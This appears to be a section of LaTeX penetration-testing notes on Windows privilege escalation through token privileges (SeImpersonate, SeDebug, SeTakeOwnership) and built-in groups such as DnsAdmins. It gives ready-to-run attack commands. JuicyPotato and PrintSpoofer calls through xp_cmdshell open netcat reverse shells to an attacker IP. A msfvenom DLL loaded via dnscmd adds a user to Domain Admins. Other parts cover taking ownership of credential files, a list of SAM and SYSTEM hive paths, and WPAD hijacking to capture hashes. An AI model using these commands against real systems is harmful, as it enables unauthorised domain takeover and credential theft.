\section{Valid accounts}


Valid account anble to abuse some windows privileges. To get a better list of
all the privilges that can be abused check this
\href{https://github.com/gtworek/Priv2Admin/blob/master/README.md}{link}

To enable priviledges, it is possible to use this
\href{https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1}{script}
which is detailed in this
\href{https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/}{blog
post}, as well as
\href{https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77}{this
one} which builds on the initial concept.


\subsection{Abusing SeImpersonate and SeAssignPrimaryToken}
Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space.

Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

The seImpersonate privilege is usually obtained after gaining remote code
execution via an application that runs in the context of a service account (for
example, uploading a web shell to an ASP.NET web application, achieving remote
code execution through a Jenkins installation, or by executing commands through
MSSQL queries). Whenever an access is gained in this way, privileges should
immediately be checked as its presence often offers a quick and easy route to
elevated privileges. 

Further details on
\href{https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt}{token
impersonation attacks}.

\subsubsection{Juicy Potato}
JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.

Does this still works?

Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.


From a MSSQL server with \verb+xp_cmdshell+
\begin{enumerate}
    \item upload \verb+juicyporato.exe+ and \verb+nc.exe+
    \item start a listener on attacker
    \item launch
\begin{verbatim}
xp_cmdshell JuicyPotato.exe -l 53375 -p \c:\windows\system32\cmd.exe -a "/c
c:\tools\nc.exe IP PORT -e cmd.exe" -t * -c "{CLSID}" 
\end{verbatim}
\end{enumerate}

for more information:
\begin{itemize}
    \item 
        \href{https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato}{juicyPotato}
    \item \href{https://ohpe.it/juicy-potato/CLSID/}{CLSID}
\end{itemize}


\subsubsection{PrintSpoofer}

\href{https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/}{PrintSpoofer}
can be used to abuse impersonation privileges on Windows 10 and Server 2019
hosts where JuicyPotato no longer works.

the tool ican spawn a SYSTEM process in the current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell

Case of reverse shell with MSSQL \verb+xp_cmdshell+

\begin{verbatim}
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  IP PORT -e cmd"
\end{verbatim}

\subsubsection{Rogue potato}

\subsubsection{Other potatos}


\subsection{Abusing Privilege: SeDebug}
This privilege allow to dump process memory. Therefor it can be used to perform
attacks like dumping lsass.


\subsubsection{RCE as system}
\begin{verbatim}
.\psgetsys.ps1; 
    [MyProcess]::CreateProcessFromParent("<winlogon_pid>",
        "c:\windows\system32\cmd.exe", "/c c:\tools\revshell.exe")
\end{verbatim}


\subsection{Abusing Privilege: SeTakeOwnership}

SeTakeOwnershipPrivilege grants a user the ability to take ownership of any
\emph{securable object} meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. 
\begin{verbatim}
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | 
Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={
    (Get-Acl $_.FullName).Owner }}
\end{verbatim}


\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown}{takeown}
Windows binary to change ownership of the file and \verb+icacals+ 
\begin{verbatim}
takeown /f FILE_PATH
icacls FILE_PATH /grant SAMAN:F
\end{verbatim}

Files of Interest
\begin{itemize}
\item \verb+c:\inetpub\wwwwroot\web.config+
\item \verb+%WINDIR%\repair\sam+
\item \verb+%WINDIR%\repair\system+
\item \verb+%WINDIR%\repair\software, %WINDIR%\repair\security+
\item \verb+%WINDIR%\system32\config\SecEvent.Evt+
\item \verb+%WINDIR%\system32\config\default.sav+
\item \verb+%WINDIR%\system32\config\security.sav+
\item \verb+%WINDIR%\system32\config\software.sav+
\item \verb+%WINDIR%\system32\config\system.sav+
\end{itemize}



\subsection{Abusing Buil-in: Event Log Readers}
Windows events  can be queried from the command line using the
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil}{wevtutil}
utility and the
\href{https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1}{Get-WinEvent} PowerShell cmdlet.

\begin{verbatim}
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 |
    findstr "/user"

# use -Credential to run as 
Get-WinEvent -LogName security |
    where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} |
    Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
\end{verbatim}

\subsection{Abusing Buil-in: DnsAdmin}
 The DNS service runs as \verb+NT AUTHORITY\SYSTEM+, so membership in this
 group could potentially be leveraged to escalate privileges on a Domain
 Controller or in a situation where a separate server is acting as the DNS
 server for the domain.

\subsubsection{DLL injection}
 Check this post \href{https://adsecurity.org/?p=4064}{post}.
he following attack can be performed when DNS is run on a Domain Controller (which is very common):
\begin{itemize}
    \item  DNS management is performed over RPC
    \item
        \href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723}{ServerLevelPluginDll} allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
    \item  When a member of the DnsAdmins group runs the dnscmd command below,
        the
        \verb+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll+ registry key is populated
    \item  When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    \item  An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
\end{itemize}

Only the dnscmd utility can be used by members of the DnsAdmins group, as they
do not directly have permission on the registry key.


\begin{verbatim}
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm 
    /add /domain' -f dll -o adduser.dll

## Loading DLL as Member of DnsAdmins
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

## Confirming Registry Key Added
reg query \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

## Checking Permissions on DNS Service
sc.exe sdshow DNS

## Stopping the DNS Service
 sc stop dns

## Starting the DNS Service
sc start dns

## Confirming Group Membership
net group "Domain Admins" /dom


## Deleting Registry Key
 reg delete \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
\end{verbatim}


As detailed in this
\href{http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html}{post}, 
it is also possible to use
\href{https://github.com/gentilkiwi/mimikatz/tree/master/mimilib}{mimilib.dll}
to gain command execution by modifying the \verb+kdns.c+ file to
execute a reverse shell one-liner or another command of our choosing.

\subsubsection{Creating a WPAD Record}
Another way to abuse DnsAdmins group privileges is by creating a WPAD record.
Membership in this group gives us the rights to
\href{https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps}{disable
global query block security}, which by default blocks this attack. Server 2008
first introduced the ability to add to a global query block list on a DNS
server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and
Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global
query block list. These protocols are quite vulnerable to hijacking, and any
domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every
machine running WPAD with default settings will have its traffic proxied
through the attack machine. Tool such as Responder~\ref{tool:responder} or
Inveigh~\ref{tool:inveigh} to perform traffic spoofing, and attempt to capture
password hashes and crack them offline or perform an SMBRelay attack.

\begin{verbatim}
## Disabling the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

## Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName NAME -ComputerName DNS_FQDN
    -IPv4Address IP
\end{verbatim}

\subsection{Abusing Buil-in: Hyper-V Administrators}
\subsection{Abusing Buil-in: Print Operators}
\subsection{Abusing Buil-in: Server Operators}
\subsection{links}
\begin{itemize}
    \item \url{https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens}
    \item \url{https://securitytimes.medium.com/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa}
    \item \url{https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962}
    \item \url{https://jlajara.gitlab.io/Potatoes_Windows_Privesc}
    \item \url{https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt}
    \item 
    \item \url{https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation}
    \item \url{https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1}
\end{itemize}

